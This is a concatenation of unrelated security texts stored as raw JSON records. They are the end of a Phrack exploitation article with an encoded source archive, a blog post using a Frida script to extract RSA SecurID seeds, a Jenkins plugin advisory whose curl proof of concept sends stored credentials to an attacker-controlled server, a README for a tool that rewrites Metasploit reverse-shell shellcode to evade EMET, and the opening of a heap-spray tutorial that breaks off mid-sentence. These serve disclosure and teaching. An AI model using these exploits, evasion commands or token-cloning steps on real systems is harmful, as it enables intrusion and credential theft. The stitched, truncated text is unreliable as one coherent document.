then\nthe object's real retain count is 6.)\n(MSB)\n--[ Conclusion\nWell you made it to the end reader. Hopefully this was useful in some way!\nWriting is very painful...\nThanks for reading!\n- nemo\n--[ References\n[1] The Objective-C Runtime: Understanding and Abusing -\nhttp:\/\/phrack.org\/issues\/66\/4.html\n[2] Abusing Performance Optimization Weaknesses to Bypass ASLR -\nhttp:\/\/www.cc.gatech.edu\/~blee303\/paper\/BH_ASLR_slides.pdf\n[3] - Lets build tagged pointers:\nhttps:\/\/www.mikeash.com\/pyblog\/ \\\nfriday-qa-2012-07-27-lets-build-tagged-pointers.html\n[4] Apple Block Conceptual -\nhttp:\/\/developer.apple.com\/library\/ios\/#documentation\/cocoa\/ \\\nConceptual\/Blocks\/Articles\/bxOverview.html#\/\/apple_ref\/doc\/uid\/ \\\nTP40007502-CH3-SW1\n[5] Big Nerd Ranch Advanced Mac OS X Programming: Block -\nhttp:\/\/www.informit.com\/articles\/article.aspx?p=1749598&seqNum=12\n[6] Non-pointer ISA\nhttp:\/\/www.sealiesoftware.com\/blog\/archive\/2013\/09\/24\/ \\\nobjc_explain_Non-pointer_isa.html\n--[ Appendix - Source Code\nbegin 644 code.tgz\nM'XL(`)7]'U4``^U:6W\/3.!3F-?X5(CL%.VU:WYTV9:<EE%D&*`^!W9D-F1W7\nMD1-O?<G83@D+_\/<]DFS'N37IT+@PZ.LTL24=7<]WSI&4&\/O83O#1HQU\"EF7+\nM,!#]-MFWK.KL.P-25$.V+,LT%0\/)BFHJUB-D[+)3.29):L?0E1`'T6WEH)CK\nMWI*?C:\/X_DD09^L\/G]<!\/ASMH@V8#U\/7UZ^_HJKY^JN:I<#ZZZJB\/T+R+CJS\nMB%]\\_7_S@G$4I^CT930)!W;J1>'1[\/%P]+L@G'EABF\/7=C!B6H).T&7WW=6_\nMV$F%)A)O(F\\@^=&P+9SA<\"`\\](@X[H(%_@>[:&,S_XV\"_[IF4?ZK%N=_%<CY\nM7\\\\=0)T0\/AC[.,!A2HU`QGJAR9B.@.K\"%P$!QC&8!E>L^Y'_,:Q+;>$;-P$_\nM&7+^![87[H;]&_FOFJ96BO]4X+]FJ0;G?Q58P?\\M0H+?!MCU0HPZYYT_+KJO\nM_KY`-7FJR1>Z+LO\"T1&2I\\>RJ[DM$Y^0FL-A2NK-A)Z?=R^Z%V^(R#&9*R@E\nM\"$*2QA,G18[MC#!8GO@S^B+4_\"@<H@3[[>QQ;`_R1^R-P=ZT!6A.GBJ.N(>=\nMJ710U.\/:UYC6A9BI<D9V3,1[\\E25^VV:1NNAA?X9IS&K#0P:(EP0R8,=#YT#\nMY$1ADK(*&B3IIM>7A+QSC:N)<XW3!#T#,=^\/'%&<3<H^4B202;S_<.12ZXD:\nM$IC)VO)@&Q!=%57,:BB$ER1(\/2C#TIA=9Y9).QY.@IY!QEV;A(DW#\/$`D0%Z\nM,.*:YXJ\/\\U%\\_8H>.U@B<U_+K7OO<1_1?C%OX-J>CP>'S.#7:GCJI:)\"'K\\)\nM19N7W6X*TC`]\/HRJURO>:3U]:-M+__+2T8?W+ULLYZ0^PI\"'\/D6Q\/ZCW2;^*\nM]O?[J(O3E,A\/QBCK:M9^]M:3^]`0Z*#KNHXLMQ$H86`GUT+-C6+1HWD*:B,\/\nMG9:4%M[WGRELM'E%'JE()&LK\/7%PSVLJ9-9JV>,A*\"\/DYRK\\%8G>Z:DJE4N`\nM8M+F!M@>7&'LMA%D'C7@H]CLHM9QIX7F$$0W\"-O3`]#B64D5(>,\"+6`<C1%.\nMO%DI#4J]6%GJ:CPKI2\/4T19+Q3B%$HTCLGBU^1E_$868S7&QJN7LCF\\G\"3J#\nM<>[Y4RAW(!:*1>?.+ZMG)@A*>%#?\\[U;\"S-6`1_S90#*V&GD$^E2L0`'\"4[%\nM)ZYS\\\/3CU'&>'F1$<1W*,-<Y+)A=+&BVQE0[\\N?Y4;^[P?&GV*.Z%M$=3J9G\nMY1Y)T\"JMPTML!.E%IQ:4M@\/:3BH*<#J*!K2BVM)D9L1@1O*$S\">=SIZ?)?5)\nMZ[!.DSA$,HFP[C>Z*OM_4W^0^%^33:OP_[IJDOA?D17N_ZO`]_G_RP]OGW_H\nMO+YXWT7$K\\K4^\\M3\"ZSP\\;';:NFZ=4L`P`JVJ'72K2+[[7GW-8+,%IO*=2Z]\nMY-&5S*-3<\\&(31UZGD0\\`7\/O6T49<1Y:W\"$86.'1ER.#V73MEP.#G?GV^83$\nM]P9XP>'_\/)Z>>7(Z!N)>VVPXX,Y+.I@E[N_\/NW2:N.BZ]U%668.$!J!G=(P+\nM(C'UY2OJ:2++,`U=U\\UVY;[SKB[S+CZ3,`5J(11LUXH8JMSYYYE6K^]^KEH+\nMKK4[\\MP4REQM6P%,\\D*&N\/!.NGEZJDMT,==Q\"1:X1+RF(N5C+0P%F;9J>_\"C\nM1AUBV6!(5<4@'`^'\/\/Y[\"_[%!7._BS8VG?^JRNS\\E]W_Z:K!X[]*`,;B1*@-\nM'0<U`TU%33>V`PRN^1K-0CZ47PX@=DJ(FA%-RN0VBY\"-12YDZH+@P$,(S<8!\nM32K2'WHR?D'D_$_MX1`\/=O,S`'G[^W]5`T,!_)=U@]__5X&%]=^)&]AD_W6K\nML\/^*9FBP_H:AJ-S^5X&2_5]IQ\\,$=A(!,]_L^?;2\"0TLE5P@>]U&1IV746^7\nM@:W-%8Z+=K+7;634>1FU[(W8\"&?]GO5FUD9)\\J$7[QZPP\/]\\N>^UC4W\\UY3\\\nM_@_VU\/3\\SS#X_5\\UV'S85Y3H1#%^8:?V4?Y`CP+O<$96WJ5>=L\\)T]BF$@].\nMT-YD;@,J]41O(\"DKSX_\\R*_WZ9$0WY-^+Y;X7QC6^VMCH__7BO-_Q;)(_&<J\nM.O_]3R6HDO^7W4NJ7*@1DK\/BXI6I'&'YJS#%0QR?S&Y\/78P'Y*>'?7*-RJK,\nMSL38B_0DG)V3R5\/7(F;ALOLF&HIG]74'C+T0Y0EOX)W\\_VG[$_P+GG.MX;_Z\nM8\/PW9<9_C?._\"ORH_`>M4,I_6_)?ECG_[X0E_A<;N\/MK8Q\/_35TIXG_=5\"C_\nM#9\/SOPI4R__\\KCC9^JXX'7F)E]@W.\/Y,J,NT,XQ2IJ_D^GBU54CFH@*#7IP5\nM[;VGPFCU[6Q1:OT%95*Z?)V[XERZ55MM?I+RO5INK\/;.Z@=)Y;N:-?ROU\/^;\nMQ?FO82FFQ?E?(7YT_I\\S;$GT[)>?D[`)^LSIS<'!P<'!P<'!P<'!P<'!P<'!\n\/P<'!\\<OB?]V9SVT`4```\n`\nend\n[ [95]News ] [ [96]Paper Feed ] [ [97]Issues ] [ [98]Authors ] [\n[99]Archives ] [ [100]Contact ]\n\u00a9 Copyleft 1985-2021, Phrack Magazine."}
{"text":"* [1]Home\n* [2]Posts\n* [3]Twitter\n* [4]YouTube\n* [5]LinkedIn\n* [6]GitHub\n\u00a9 2016-2023. All rights reserved.\nBuilt with [7]Hugo Theme [8]Blackburn\nCloning RSA tokens with Frida\n12 Dec 2019, 10:13\nAt work we are using [9]RSA SecurID for login to corporate services.\nRSA provides software tokens which are mobile applications that\ngenerate one-time passwords that change every minute or so. These\napplications are closed source and they use proprietary protocol to\nprovision the token. This basically means that you are vendor locked-in\nwith something that relies on security through obscurity.\nI wanted to have an open-source implementation of RSA SecurID and until\nnow I have been using [10]stoken together with [11]rsa_ct_kip for token\nprovisioning. This has been working great until my employer decided to\nswitch to the new [12]RSA SecurID Authenticate app which uses some\ndifferent kind of token provisioning that doesn\u2019t work with rsa_ct_kip.\nAt this point I have two options:\n1. Reverse engineer the mobile app and find how the provisioning is\ndone. I already did this for the old [13]app and this was my\ncontribution to the rsa_ct_kip project.\n2. Provision a token with the new app on a rooted phone and then\n\u201cexport\u201d it from there.\nReversing the provisioning protocol will take time, so I decided to go\nwith option 2 for the short term. I already know that RSA tokens need\ntwo things to be provisioned \u2013 serial number and root seed (16 bytes).\nOnce I get those, I can continue using stoken on all of my devices.\nMy plan was to install the RSA app on my rooted Nexus 5, provision a\ntoken and then analyze the application DB. The application DB has a\nSERIALNUMBER and ROOTSEED columns. The serial number was written in\nplain text but the root seed was a huge binary blob. Turns out we need\nsome reversing after all \u2026\nThis is where I decided to give [14]Frida a try. Frida is a dynamic\ninstrumentation toolkit that supports all major platforms, including\nAndroid. It allows you to install hooks into a target process that can\ntrace or change execution flows. It\u2019s pretty amazing!\nI managed to extract the serial number and the root seed from [15]RSA\nSecurID Authenticate ver.3.1.0 with the following script:\nfunction bytes2hex(array) {\nvar result = '';\nfor (var i = 0; i < array.length; ++i) {\nresult += ('0' + (array[i] & 0xFF).toString(16)).slice(-2);\n}\nresult += ' (' + array.length + ' bytes)'\nreturn result;\n}\nJava.perform(function() {\nJava.use('com.rsa.securidlib.g.gg').$init.overload('[B').implementation = fu\nnction(byteArr) {\nif (byteArr.length == 16) {\nconsole.log(\"Seed: \" + bytes2hex(byteArr));\n}\nreturn this.$init(byteArr);\n}\nJava.use('com.rsa.securidlib.android.AndroidSecurIDLib').getNextOtpWithDataP\nrotection.implementation = function(str, byteArr, map) {\nconsole.log(\"Serial number: \" + str);\nreturn this.getNextOtpWithDataProtection(str, byteArr, map);\n}\n});\nOnce you have the serial number and the seed, you can use [16]this\nscript to get the token into a CTF format (expiration doesn\u2019t matter):\n$ SEED=<seed> SN=<serial_number> EXPIRATION=2030\/12\/31 .\/make_RSA_token.sh\nand then import it into stoken:\n$ stoken import --token=<ctf_token>\nCheers :)\n[17]Controlling purifiers over the internet\n[18]Signing files with Solo"}
{"text":"## Jenkins Ansible Tower Plugin - Information disclosure vulnerability\n\n##### Discovered by:\n* Peter Adkins <peter.adkins@kernelpicnic.net>\n\n##### Access:\n* Local network; authenticated access\n* Remote network; authenticated access (See notes)\n* Remote network; 'drive-by' via CSRF\n\n##### Tracking and identifiers:\n* CVE - CVE-2019-10310\n\n##### Versions Affected:\n* Jenkins Ansible Tower Plugin 0.9.1\n\n##### Vendor involvement:\n* 2019-03-12 - Vendor Disclosure\n* 2019-04-30 - Vendor Patched\n* 2019-05-06 - Public Release\n\n##### Notes:\n1. This may be exploited by an anonymous user if unauthenticated access is enabled in Jenkins.\n\n1. As this vulnerability is exploitable through HTTP GET request, this vulnerability may also be exploited via Cross Site Request Forgery (CSRF).\n\n1. Originally published under [TALOS-2019-0786](https:\/\/talosintelligence.com\/vulnerability_reports\/TALOS-2019-0786). Mirrored here here for tracking purposes.\n\n##### Overview:\nAn exploitable information disclosure vulnerability exists in the `testTowerConnection` function of the Jenkins Ansible Tower Plugin 0.9.1. A specially crafted HTTP request from a user with Overall\/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker-controlled server.  This vulnerability is also present in the `fillTowerCredentialsIdItems` endpoint exposed by this plugin, which allows for the enumeration of credentials identifiers required for this attack to be successful.\n\nIn addition to the above, if the responding server does not return properly formatted JSON document, the response will be reflected to the user as part of the reported error resulting in an HTTP GET only Server Side Request Forgery (SSRF).\n\n##### Analysis:\nThis vulnerability exists in the `testTowerConnection` endpoint exposed by the `doTestTowerConnection` method of `org.jenkinsci.plugins.ansible_tower.util.TowerInstallation` due to missing Jenkins permissions check. The same missing permissions check also exists in the `doFillTowerCredentialsIdItems` method, which yields the ability to enumerate credentials.\n\nDue to the way in which this plugin expects to authenticate against the remote Ansible Tower instance, the credentials associated with the attacker specified `towerCredentialsId` are base64-encoded and submitted as part of the HTTP Authorization header to the attacker-controlled server, and are also included plaintext in a JSON document submitted to the attacker specified endpoint. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.\n\n```\n# List credentials on target Jenkins instance.\n$ curl -s -X GET -G \\\n    -d 'pretty=true' \\\n    'http:\/\/127.0.0.1:8080\/jenkins\/descriptorByName\/org.jenkinsci.plugins.ansible_tower.util.TowerInstallation\/fillTowerCredentialsIdItems'\n{\n\"_class\" : \"com.cloudbees.plugins.credentials.common.StandardListBoxModel\",\n\"values\" : [\n    {\n    \"name\" : \"- none -\",\n    \"selected\" : false,\n    \"value\" : \"\"\n    },\n    {\n    \"name\" : \"BBBBBB\/****** (ExampleOnly)\",\n    \"selected\" : false,\n    \"value\" : \"01e367ef-54fb-4da0-8044-5112935037bb\"\n    },\n    {\n    \"name\" : \"SecureUsername\/****** (Credentials for X)\",\n    \"selected\" : false,\n    \"value\" : \"287fcbe2-177e-4108-ac58-efdc0a507376\"\n    },\n    {\n    \"name\" : \"A Secret Text Entry\",\n    \"selected\" : false,\n    \"value\" : \"532ba431-e25d-4aad-bc74-fb5b2cc03bd7\"\n    }\n]\n}\n\n# Send credentials to an attacker's server (http:\/\/127.0.0.1:7000?).\n# The trailing '?' is to ensure that the expected path is appended as a\n# query parameter, rather than part of the query path.\n#\n# Two requests are performed by Jenkins here. The first is a 'ping', which\n# requires that the target respond with a well formed JSON response -\n# though any JSON response will do. If this first request fails, the reply\n# will be reflected to the client (SSRF). If it succeeds, a subsequent\n# POST will be performed which contains the credentials.\n#\n$ curl -s -X GET -G \\\n    -d 'towerURL=http:\/\/127.0.0.1:7000\/report.json?' \\\n    -d 'towerTrustCert=false' \\\n    -d 'enableDebugging=true' \\\n    -d 'towerCredentialsId=287fcbe2-177e-4108-ac58-efdc0a507376' \\\n    'http:\/\/127.0.0.1:8080\/jenkins\/descriptorByName\/org.jenkinsci.plugins.ansible_tower.util.TowerInstallation\/testTowerConnection'\n```\n\nThe request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:\n\n```\n# First request from Jenkins (GET)\n\/report.json?\/api\/v2\/ping\/\nHost: 127.0.0.1:7000\nConnection: Keep-Alive\nUser-Agent: Apache-HttpClient\/4.1-alpha1 (java 1.5)\n\n# Second request from Jenkins (POST)\n\/report.json?\/api\/v2\/authtoken\/\nAuthorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v\nContent-Type: application\/json\nContent-Length: 61\nHost: 127.0.0.1:7000\nConnection: Keep-Alive\nUser-Agent: Apache-HttpClient\/4.1-alpha1 (java 1.5)\n\n{\"username\":\"SecureUsername\",\"password\":\"SecurePasswordOhNo\"}\n```\n"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]secretsquirrel \/ [31]fido Public\n* [32]Notifications\n* [33]Fork 60\n* [34]Star 202 (BUTTON)\nTeaching old shellcode new tricks\n[35]202 stars [36]60 forks [37]Activity\n[38]Star (BUTTON)\n[39]Notifications\n* [40]Code\n* [41]Issues 0\n* [42]Pull requests 0\n* [43]Actions\n* [44]Projects 0\n* [45]Security\n* [46]Insights\n(BUTTON) Additional navigation options\n* [47]Code\n* [48]Issues\n* [49]Pull requests\n* [50]Actions\n* [51]Projects\n* [52]Security\n* [53]Insights\nsecretsquirrel\/fido\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nmaster\nSwitch branches\/tags (BUTTON)\n____________________\n(BUTTON) Branches (BUTTON) Tags\nCould not load branches\nNothing to show\n[54]{{ refName }} default\n[55]View all branches\nCould not load tags\nNothing to show\n[56]{{ refName }} default\n[57]View all tags\nName already in use\n(BUTTON)\nA tag already exists with the provided branch name. Many Git commands\naccept both tag and branch names, so creating this branch may cause\nunexpected behavior. Are you sure you want to create this branch?\n(BUTTON) Cancel (BUTTON) Create\n[58]1 branch [59]0 tags\nCode\n* (BUTTON) Local\n* (BUTTON) Codespaces\n* Clone\n(button) HTTPS (button) GitHub CLI\nhttps:\/\/github.com\/s\nUse Git or checkout with SVN using the web URL.\ngh repo clone secret\nWork fast with our official CLI. [60]Learn more about the CLI.\n* [61]Open with GitHub Desktop\n* [62]Download ZIP\nSign In Required\nPlease [63]sign in to use Codespaces.\nLaunching GitHub Desktop\nIf nothing happens, [64]download GitHub Desktop and try again.\n(BUTTON)\nLaunching GitHub Desktop\nIf nothing happens, [65]download GitHub Desktop and try again.\n(BUTTON)\nLaunching Xcode\nIf nothing happens, [66]download Xcode and try again.\n(BUTTON)\nLaunching Visual Studio Code\nYour codespace will open once ready.\nThere was a problem preparing your codespace, please try again.\nLatest commit\nGit stats\n* [67]54 commits\nFiles\n[68]Permalink\nFailed to load latest commit information.\nType\nName\nLatest commit message\nCommit time\n[69]parser_output\n[70]tor_browser_poc\n[71]Defcon_25_2017.pdf\n[72]README.md\n[73]REconBR_2017.pdf\n[74]fido.py\n[75]testing.py\n(BUTTON) View code\n[76]fido [77]WARNING: If the 2nd stage payload uses the hash api from\nmetasploit that loads Win APIs from the Export Address Table and jmp's\ninto them, EMET will catch it. [78]Usage [79]Other Examples:\n[80]ExternGPAFC [81]ExternOffset\n[82]README.md\nfido\nTeaching an old shellcode new tricks\nGive fido.py a x86 (32 bit or 64 bit) windows shellcode and it will\nstrip off Stephen Fewer's hash API stub and replace it with something\nthat bypasses EMET Caller and EAF+ checks but keeps the actual API\ncalls in use.\nWARNING: If the 2nd stage payload uses the hash api from metasploit that\nloads Win APIs from the Export Address Table and jmp's into them, EMET will\ncatch it.\nIf the warning didn't make sense, you might want to walk away or read\nup:\n* REcon BR Slides:\n[83]https:\/\/github.com\/secretsquirrel\/fido\/blob\/master\/REconBR_2017\n.pdf\n* Defcon 25 Slides:\n[84]https:\/\/github.com\/secretsquirrel\/fido\/blob\/master\/Defcon_25_20\n17.pdf\n* Demo1 (Hash Mangling POC): [85]https:\/\/youtu.be\/p3vFRx5dur0\n* Demo2 (Tor Exploit POC): [86]https:\/\/youtu.be\/oqHT6Ienudg\nUsage\nCan take input from stdout and output to stdout:\nmsfvenom -p windows\/exec CMD=calc EXITFUNC=thread | ~\/github\/fido\/testharness.py\n-m -b Tcpview.exe -p ExternGPA -t win10  > test.bin\nCan take input from cmdline (via -s).\nWant win7-win10 compatibility? Use the following command:\nmsfvenom -p windows\/exec CMD=calc EXITFUNC=thread | ~\/github\/fido\/fido.py -p Ext\nernGPA -l api-ms-win-core-libraryloader-l1-1-0.dll -d kernel32.dll > test.bin\nThis will use GetProcAddress in\napi-ms-win-core-libraryloader-l1-1-0.dll import from the kernel32.dll\nloaded module.\nHelp output:\n[!] -s is required either from cmd line flag or stdin <cat code.bin> | .\/fido.py\nusage: use \"fido.py --help\" for more information\nThis code imports metasploit sourced x86 windows shellcode that employs\nStephen Fewers Hash API stub and replaces it to bypass EMET Caller\/EAF checks\nand other bolt on mitigations. Accepts msfvenom output from stdin or from disk.\nDoesn't do logic checks on provided payload to ensure it is x86 (32bit) or for w\nindows\nOS (up to you to be correct)\npositional arguments:\ninfile\noutfile\noptional arguments:\n-h, --help            show this help message and exit\n-b TARGETBINARY, --targetbinary TARGETBINARY\nBinary that shellcode will be customized to (Optional)\n-t OS, --OSTarget OS  OS target for looking for target DLL Import Tables: winX\nP, win7, win8, winVista, win10\n-s CODE, --shellcode CODE\nx86\/x64 Windows Shellcode with Stephen Fewers Hash API p\nrepended (from msfvenom) can be from stdin\n-d DLL, --DLLName DLL\nIf you know the DLL in the IAT you are targeting enter t\nhis, no need for OS flag.\n-l IMPORTNAME, --Import IMPORTNAME\nFor use with -d and ExternGPA (-p), specify either 'kern\nel32.dll' or\n'api-ms-win-core-libraryloader' -- you need to know with\nimport you are targeting.\nTo know, run without -d for a list of candidates. Defaul\nt is kernel32.dll but not always right!\n-m, --mangle          Mangle metasploit hash apis from their original values (\nyou want to do this)\n-o OUTPUT, --output OUTPUT\nHow you would like your output: [c], [p]ython, c[s]harp\nDefault: stdout.\n-p PARSER_STUB, --parser_stub PARSER_STUB\nBy default this assumes that GetProcAddress (GPA) is in\nthe targetbinary's\nImport Address Table (IAT) if no targetbinary or DLL nam\ne is provided.\nFour options:\nGPA  - GPA is in targetbinary IAT (default)\nLLAGPA - LoadlibraryA(LLA)\/GPA is in the targetbinar\ny IAT (smallest shellcode option)\nExternGPA -- need DLLName or targetbinary to use\nExternLLAGPA -- need DLLName or targetbinary to use\nExternGPAFC -- -d kernel32.dll -l kernelbase.dll  #\nonly works on win8 - win10\nOffsetGPA -- -b target.EXE # static offset to that v\nersion of software (target EXE)\nExternOffsetGPA -- -b target.DLL -d import_dll # sta\ntic\n-n, --donotfail       Default: Fail if Stephen Fewers Hash API stub is not the\nre, use -n to bypass\n-M MODE, --mode MODE ASM mode 32 or 64, usually automatic\nOther Examples:\nExternGPAFC\nWorks on Win8-Win10 only.\ncat ~\/github\/metasploit-framework\/reverse_shell_x64_8080_172.16.186.1.bin |  .\/\nfido.py -b ~\/github\/the-backdoor-factory\/whois64.exe -m -p ExternGPAFC -t win10\n> test.bin\n[*] Length of submitted payload: 0x1cc\n[*] Stripping Stripping Fewers 64bit hash stub\n[*] Length of code after stripping: 258\n[*] Disassembling payload\n[*] Mangling kernel32.dll!LoadLibraryA call hash: 0x5df8d241\n[*] Mangling ws2_32.dll!WSAStartup call hash: 0xe6fe222e\n[*] Mangling ws2_32.dll!WSASocketA call hash: 0x16f19f04\n[*] Mangling ws2_32.dll!connect call hash: 0x76223a2d\n[*] Mangling kernel32.dll!CreateProcessA call hash: 0x6d6e1502\n[*] Mangling kernel32.dll!WaitForSingleObject call hash: 0x44e7a13f\n[*] Mangling kernel32.dll!ExitThread call hash: 0x5a4eb474\n[*] Mangling kernel32.dll!GetVersion call hash: 0xf1669f77\n[*] Mangling ntdll.dll!RtlExitUserThread call hash: 0x66b4939a\n[*] Called APIs: ['kernel32.dll!LoadLibraryA', 'ws2_32.dll!WSAStartup', 'ws2_32.\ndll!WSASocketA', 'ws2_32.dll!connect', 'kernel32.dll!CreateProcessA', 'kernel32.\ndll!WaitForSingleObject', 'kernel32.dll!ExitThread', 'kernel32.dll!GetVersion',\n'ntdll.dll!RtlExitUserThread']\n[*] String Table: b'ExitThread\\x00WSASocketA\\x00CreateProcessA\\x00kernel32\\x00Lo\nadLibraryA\\x00RtlExitUserThread\\x00ws2_32\\x00connect\\x00GetVersion\\x00WaitForSin\ngleObject\\x00ntdll\\x00WSAStartup\\x00'\n[*] Building lookup table\n[*] Using ExternGPAFC from  hash: 0x0, import name: kernelbase.dll\n[*] Assembling lookup table stub\n[*] Payload complete\n[*] Output size: 964\nExternOffset\nUses the exact location of GetProcAddress Offset for a particular dll\nand import dll. In this case, kernel32_10.0.16237_32bit.dll is the\ntarget version bianry, and GPA exists in kernel32.dll via (minwin).\ncat ~\/github\/metasploit-framework\/reverse_shell_x64_8080_172.16.186.1.bin |  .\/f\nido.py -b kernel32_10.0.16237_32bit.dll -d kernel32.dll -m -p ExternOffsetGPA -t\nwin10 > test.bin\n[*] Length of submitted payload: 0x1cc\n[*] Stripping Stripping Fewers 64bit hash stub\n[*] Length of code after stripping: 258\n[*] Disassembling payload\n[*] Mangling kernel32.dll!LoadLibraryA call hash: 0x89d3d69b\n[*] Mangling ws2_32.dll!WSAStartup call hash: 0x23b6665d\n[*] Mangling ws2_32.dll!WSASocketA call hash: 0x7c77f885\n[*] Mangling ws2_32.dll!connect call hash: 0x78e785f1\n[*] Mangling kernel32.dll!CreateProcessA call hash: 0x53e02b59\n[*] Mangling kernel32.dll!WaitForSingleObject call hash: 0xcb5b4068\n[*] Mangling kernel32.dll!ExitThread call hash: 0xcd188037\n[*] Mangling kernel32.dll!GetVersion call hash: 0x6a298791\n[*] Mangling ntdll.dll!RtlExitUserThread call hash: 0x1b59416e\n[*] Called APIs: ['kernel32.dll!LoadLibraryA', 'ws2_32.dll!WSAStartup', 'ws2_32.\ndll!WSASocketA', 'ws2_32.dll!connect', 'kernel32.dll!CreateProcessA', 'kernel32.\ndll!WaitForSingleObject', 'kernel32.dll!ExitThread', 'kernel32.dll!GetVersion',\n'ntdll.dll!RtlExitUserThread']\n[*] String Table: b'RtlExitUserThread\\x00WSAStartup\\x00CreateProcessA\\x00WaitFor\nSingleObject\\x00WSASocketA\\x00LoadLibraryA\\x00ws2_32\\x00GetVersion\\x00ExitThread\n\\x00ntdll\\x00connect\\x00kernel32\\x00'\n[*] Building lookup table\n[*] Loading PE in pefile\n[*] Parsing data directories\n[*] Found API: loadlibrarya\n[*] Found API: getprocaddress\n[*] Both LLA\/GPA APIs found!\n[*] Using ExternOffsetGPA from kernel32.dll hash: 0x6a4abc5b, import name: main_\nmodule\n[*] Parsing data directories...\n[*] GPA offset: 0x710a8\n[*] Assembling lookup table stub\n[*] Payload complete\n[*] Output size: 830\nAbout\nTeaching old shellcode new tricks\nTopics\n[87]assembly [88]shellcode [89]msfvenom [90]emet [91]metasploit\n[92]iat-parsing\nResources\n[93]Readme\n[94]Activity\nStars\n[95]202 stars\nWatchers\n[96]21 watching\nForks\n[97]60 forks\n[98]Report repository\n[99]Releases\nNo releases published\n[100]Packages 0\nNo packages published\nLanguages\n* [101]Python 89.4%\n* [102]HTML 5.8%\n* [103]JavaScript 4.8%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [104]Terms\n* [105]Privacy\n* [106]Security\n* [107]Status\n* [108]Docs\n* [109]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"[1]FuzzySec\n* [2]Home\n* [3]Tutorials\n* [4]Scripting\n* [5]Exploits\n* [6]Links\n* [7]Patreon\n* [8]Contact\n__________________________________________________________________\n*\n* [9]Home \u00bb\n* [10]Tutorials \u00bb\n* Spraying the Heap [Chapter 2: Use-After-Free]\n(BUTTON) [11][become_a_patron_button.png]\nPart 9: Spraying the Heap [Chapter 2: Use-After-Free] \u2013 Finding a needle in a\nHaystack\nHello and welcome back to part 2 of this 2-part tutorial about heap\nspraying. This tutorial will walk you through precision heap spraying\non IE8. There are two basic cases where you will need to be extremely\nprecise with your heap spray: (1) You have to deal with DEP in which\ncase you need to be able to redirect execution flow to the beginning of\nyour ROP-chain, (2) you are exploiting a Use-After-Free and need to\nsatisfy the conditions of a Vtable Method. For your enjoyment (and\nPain) I wanted to find an example which deals with both these issues\nhowever many of these vulnerabilities a quite complex and not\nnecessarily suited for an introduction. Two things should be made clear\nhere. First of all practice makes perfect, find vulnerabilities rip\nthem apart, get slapped around, Try Harder, get slapped less and carry\non. Secondly this tutorial doesn't focus on vulnerability analysis, as\nalways these tutorials are about the obstacles you will face when\nwriting exploits and how to overcome them.\nToday we will looking at MS13-009, you can find the metasploit module\n[12]here. I have also added some links below to reading material which\nI can highly recommend if you want to get a better grip on the subject.\nDebugging Machine:\nWindows XP SP3 with IE8\nLinks:\nExploit writing tutorial part 11 : Heap Spraying Demystified (corelan)\n- [13]here\nHeap Feng Shui in JavaScript (Alexander Sotirov) - [14]here\nPost-mortem Analysis of a Use-After-Free Vulnerability (Exploit-Monday)\n- [15]here\nHeap spraying in Internet Explorer with rop nops (GreyHatHacker) -\n[16]here\nCVE-2013-0025 MS13-009 IE SLayouRun (Chinese analysis of ms13-009, you\nwill probably need to load this from the google cache) - [17]here\nIntroduction\nI suppose this topic needs some introduction however you will discover\nthat many of the obstacles we will face are not unfamiliar to you. I\nwill not be able to delve to deeply into all the finer points as that\nwould take to much time. If some of the topics here seem unfamiliar to\nyou I suggest you read Part 7 (Return Oriented Programming) and Part 8\n(Spraying the Heap [Chapter 1: Vanilla EIP]) of this tutorial series in\naddition to the reading material above.\nBefore we talk about Use-After-Free we need to understand what vtables\nare. The C++ language allows base-classes to define virtual functions.\nDerived classes of the base-class can define their own implementation\nof these functions. Hence virtual functions allow derived classes to\nreplace the implementation provided by the base-class. The compiler\nmakes sure the replacement is always called whenever the object in\nquestion is actually of the derived class. All of this happens at\nruntime.\nVtables hold the pointers to the various implementations of the\nfunctions defined in the base-class. When a function needs to be called\nat runtime the appropriate pointer is selected from the vtable in\naccordance with the derived class that needs it. We can see a graphical\nrepresentation of this below.\nUse-After-Free vulnerabilities are often quite complex and their cause\nvaries from case to case. Normally execution flow works like this: (1)\nAt some point an object gets created and is associated with a vtable\nthen (2) later the object gets called by 